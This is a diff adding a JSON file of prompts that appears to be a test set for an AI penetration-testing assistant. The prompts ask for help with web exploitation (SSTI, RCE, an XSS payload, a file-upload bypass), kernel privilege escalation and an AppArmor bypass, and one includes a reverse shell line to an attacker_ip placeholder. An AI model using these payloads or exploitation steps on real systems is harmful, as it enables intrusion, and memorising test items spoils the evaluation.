@@ -1,0 +1,57 @@
+[
+    {
+        "category": "",
+        "activity": "general",
+        "input": "Hi"
+    },
+    {
+        "category": "Web",
+        "activity": "reconnaissance",
+        "input": "Can you search for jinja2 SSTI vulnerability and exploitation?"
+    },
+    {
+        "category": "Web",
+        "activity": "reconnaissance",
+        "input": "in a CTF, once I gained access to JetBrains TeamCity, I need to get remote access (ex. via RCE). Can you find a vulnerability?"
+    },
+    {
+        "category": "Web",
+        "activity": "reconnaissance",
+        "input": "I need to perform subdomain enumeration with goburp on the domain *.running.thm, can you help me identify useful wordlists?"
+    },
+    {
+        "category": "Web",
+        "activity": "reconnaissance",
+        "input": "Run a web search for Jenkins 2.263 vulnerabilities. Is there anything I could use for RCE?"
+    },
+    {
+        "category": "Web",
+        "activity": "code_analysis",
+        "input": "Analyze the following code. If it contains an XSS vulnerability, provide an ideal payload. ```function cfpParam(name) {\n    var regex = new RegExp(\"[#]\" + name + \"=([^\\\\?&#]*)\");\n    var t = window.location.href;\n    var loc=t.replace(/%23/g,\"#\");\n    var results = regex.exec(loc);\n    return (results === null) ? \"\" : unescape( results[1] );\n}\n\nfunction cfpMatchDef(val,regex,def) {\n    var results = regex.exec(val);\n    return (results === null) ? def : val;\n}\n\nfunction cfpAlphaParam(name,def) {\n    var regex = new RegExp(\"^[a-zA-Z0-9.!?; \\t_]+$\");\n    return cfpMatchDef(cfpParam(name),regex,def);\n}\n\nvar cfpPid= cfpAlphaParam(\"pid\",0);\nvar cfpPrBase=\"https://www.bugbountyhunter.com/\";\nvar cfpClick = cfpParam(\"clk\");\nvar cfpOrd = cfpParam(\"n\");\n\nif(cfpOrd === \"\"){\n    var axel = Math.random() + \"\";\n    cfpOrd = axel * 1000000000000000000;\n}\n\nfunction pr_swfver(){\n    var osf,osfd,i,axo=1,v=0,nv=navigator;\n    if(nv.plugins&&nv.mimeTypes.length){\n        osf=nv.plugins[\"Shockwave Flash\"];\n        if(osf&&osf.description){\n            osfd=osf.description;\n            v=parseInt(osfd.substring(osfd.indexOf(\".\")-2))\n        }\n    }\n    else{\n        try{\n            for(i=5;axo!=null;i++){\n                axo=new ActiveXObject(\"ShockwaveFlash.ShockwaveFlash.\"+i);v=i\n            }\n        }catch(e){}\n    }\n    return v;\n}\n\nvar pr_d=new Date();pr_d=pr_d.getDay()+\"|\"+pr_d.getHours()+\":\"+pr_d.getMinutes()+\"|\"+-pr_d.getTimezoneOffset()/60;\nvar pr_redir=cfpClick+\"$CTURL$\";\nvar pr_nua=navigator.userAgent.toLowerCase();\nvar pr_sec=((document.location.protocol=='https:')?'&secure=1':'');\nvar pr_pos=\"\",pr_inif=(window!=top);\n\nif(pr_inif){\n    try{\n        pr_pos=(typeof(parent.document)!=\"unknown\")?(((typeof(inDapIF)!=\"undefined\")&&(inDapIF))||(parent.document.domain==document.domain))?\"&pos=s\":\"&pos=x\":\"&pos=x\";\n    }\n    catch(e){\n        pr_pos=\"&pos=x\";\n    }\n    if(pr_pos==\"&pos=x\"){\n        var pr_u=new RegExp(\"[A-Za-z]+:[/][/][A-Za-z0-9.-]+\");\n        var pr_t=this.window.document.referrer;\n        var pr_m=pr_t.match(pr_u);\n        if(pr_m!=null){\n            pr_pos+=\"&dom=\"+pr_m[0];\n        }\n    }\n    else{\n        if(((typeof(inDapMgrIf)!=\"undefined\")&&(inDapMgrIf))||((typeof(isAJAX)!=\"undefined\")&&(isAJAX))){\n            pr_pos+=\"&ajx=1\"\n        }\n    }\n}\nvar pr_s=document.location.protocol+\"//\"+cfpPrBase+\"&flash=\"+pr_swfver()+\"&time=\"+pr_d+\"&redir=\"+pr_redir+pr_pos+pr_sec+\"&r=\"+cfpOrd;\ndocument.write(\"<script src='\"+pr_s+\"'><\\/script>\");\n```"
+    },
+    {
+        "category": "Web",
+        "activity": "code_analysis",
+        "input": "I was able to read the following php code ina target web application, how can I exploit the File Upload vulnerability? \n```\n<?php\nsession_start();\nif (!isset($_SESSION['user'])) {\n    header(\"Location: login.php\");\n    exit;\n}\n\nrequire_once 'config.php';\n$db = new mysqli(DB_HOST, DB_USER, DB_PASS, DB_NAME);\n\nif ($db->connect_error) {\n    die(\"Connection failed: \" . $db->connect_error);\n}\n\n$userId = $_SESSION['user_id'];\n$query = \"SELECT * FROM users WHERE id = ?\";\n$stmt = $db->prepare($query);\n$stmt->bind_param(\"i\", $userId);\n$stmt->execute();\n$result = $stmt->get_result();\n\nif ($result->num_rows > 0) {\n    $user = $result->fetch_assoc();\n} else {\n    echo \"User not found.\";\n    exit;\n}\n\n/*\n * OK, here's the deal: We're limiting uploads to specific file types.\n * First, we check if the file's MIME type is in our $allowedTypes array.\n * If it isn't, we show an error and stop the process right there.\n * Next, we check the file extension just to be extra sure the file's legit.\n * If both checks pass, we move on and upload the file. Otherwise, we bail.\n */\n\n$allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];\nif ($_SERVER['REQUEST_METHOD'] === 'POST') {\n    $uploadDir = '/uploads/';\n    $uploadFile = $uploadDir . basename($_FILES['file']['name']);\n    \n    $fileType = $_FILES['file']['type'];\n    if (!in_array($fileType, $allowedTypes)) {\n        echo \"Invalid file type.\";\n        exit;\n    }\n\n    $fileExt = pathinfo($uploadFile, PATHINFO_EXTENSION);\n    $allowedExts = ['jpg', 'jpeg', 'png', 'pdf'];\n    if (!in_array(strtolower($fileExt), $allowedExts)) {\n        echo \"Invalid file extension.\";\n        exit;\n    }\n\n    if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadFile)) {\n        echo \"File successfully uploaded.\";\n    } else {\n        echo \"Error uploading file.\";\n    }\n}\n?>```"
+    },
+    {
+        "category": "Web",
+        "activity": "code_analysis",
+        "input": "Here is a piece of code that handles user authentication, the backend is Express.js; the application is using client-side validation but I want to see if I can still apply CVE-2024-22019 to exploit the authentication.\n\nFrontend code:\n```\nfunction validateLoginInput(username, password) {\n    const _0x5a3f = ['test', 'length', 'match', 'concat'];\n    const usernameRegex = /^[a-zA-Z0-9_.-]+$/;\n    const passwordRegex = new RegExp('^(?=.*[A-Za-z])(?=.*\\\\d)(?=.*[@$!%*#?&])[A-Za-z\\\\d@$!%*#?&]{8,}$');\n    \n    const validateCredentials = {\n        username: (u) => {\n            const lengthCheck = u.length >= 3 && u.length <= 50;\n            const formatCheck = usernameRegex[_0x5a3f[0]](u);\n            return lengthCheck && formatCheck;\n        },\n        password: (p) => {\n            return passwordRegex[_0x5a3f[0]](p);\n        }\n    };\n\n    const errorHandlers = {\n        username: () => { throw new Error('Username validation failed'); },\n        password: () => { throw new Error('Password validation failed'); }\n    };\n\n    const performValidation = (type, value) => {\n        const validator = validateCredentials[type];\n        const errorHandler = errorHandlers[type];\n        \n        return validator(value) ? true : errorHandler();\n    };\n\n    const validationSequence = [\n        () => performValidation('username', username),\n        () => performValidation('password', password)\n    ];\n\n    return validationSequence.every(check => check());\n}\n\nfunction attemptLogin() {\n    const getInputValue = (id) => {\n        const inputElement = document.getElementById(id);\n        return inputElement ? inputElement.value : '';\n    };\n\n    const credentials = {\n        username: getInputValue('username'),\n        password: getInputValue('password')\n    };\n\n    try {\n        const validationResult = validateLoginInput(\n            credentials.username, \n            credentials.password\n        );\n        \n        if (validationResult) {\n            // Proceed with login logic\n            console.log('Validation successful');\n        }\n    } catch (error) {\n        const displayError = (msg) => {\n            const errorDisplay = document.getElementById('error-message');\n            if (errorDisplay) {\n                errorDisplay.textContent = msg;\n                errorDisplay.style.display = 'block';\n            }\n        };\n        \n        displayError(error.message);\n    }\n}\n```"
+    },
+    {
+        "category": "OS",
+        "activity": "privilege_escalation",
+        "input": "I tried exploiting CVE-2024-1086 (use-after-free in netfilter) for privilege escalation. However, the target was running kernel v6.6.18 with SELinux enforcing, KASLR, and patched against this CVE. My initial exploit failed due to these defenses and the patch. Afterward, I shifted focus to SLUBStick (kernel heap exploit), which works on kernels from v5.9 onwards, including the latest ones. This aligns better with my target system. Can you help me with SLUBStick exploit?"
+    },
+    {
+        "category": "OS",
+        "activity": "privilege_escalation",
+        "input": "On Ubuntu 22.04 I got access as john user that is in the sudo group, however I can only execute \nthe following:\n```\nUser john may run the following commands on this host:\n    (ALL) NOPASSWD: /bin/systemctl restart apache2\n    (ALL) NOPASSWD: /bin/journalctl -u apache2\n```\n\nNote that I do not have write permissions to sudoers:\n```\n-r--r----- 1 root root 755 /etc/sudoers\n```\n\nCan you search how I can leverage my permissions (systemctl and journalctl for apache) to get privesc?"
+    },
+    {
+        "category": "OS",
+        "activity": "privilege_escalation",
+        "input": "On Ubuntu 20.04 I detected the Polkit pkexec (0.105) privesc vulnerability (CVE-2021-4034), so I have the following:\n```\necho -e '#!/bin/bash\\nbash -i >& /dev/tcp/attacker_ip/4444 0>&1' > /tmp/exploit.sh\nchmod +x /tmp/exploit.sh\npkexec /tmp/exploit.sh\n```\n\nHowever for some reason it doesn't work, as seen there:\n```\nbash: /tmp/exploit.sh: command not found\n```\n\nSo I need to undersand what is causing the failure, AppArmor is enabled:\n```\nsudo aa-status\napparmor module is loaded.\n1 profiles are in enforce mode:\n/usr/bin/pkexec\n```\n\nOr maybe that's because noexec there:\n```\nmount | grep /tmp\n/dev/sda1 on /tmp type ext4 (rw,noexec)\n```\n\nI think that for the /tmp noexec I can just run the exploit from another folder, however I need you to search how can I bypass this AppArmor protection."
+    }
+]
